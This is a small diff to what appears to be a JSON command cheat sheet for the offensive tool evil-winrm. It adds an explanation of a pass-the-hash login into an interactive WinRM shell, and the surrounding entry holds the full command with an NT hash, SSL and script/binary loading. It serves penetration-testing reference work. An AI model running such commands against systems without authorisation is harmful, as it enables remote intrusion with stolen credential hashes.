@@ -89,5 +89,6 @@
       "label": "SSL + load scripts/binaries",
       "command": "evil-winrm -i <ip> -u <user> -H <nt_hash> -S -s /scripts/ -e /binaries/"
     }
-  ]
+  ],
+  "explain": "Pass-the-hash into an interactive WinRM shell:\n  evil-winrm -i <ip>       the target (WinRM 5985/5986)\n  -u <user>                the account\n  -H <nt_hash>             authenticate with its NT hash instead of a password\nThe account must be in Remote Management Users. Add -S for HTTPS and -s/-e for local script/binary directories."
 }
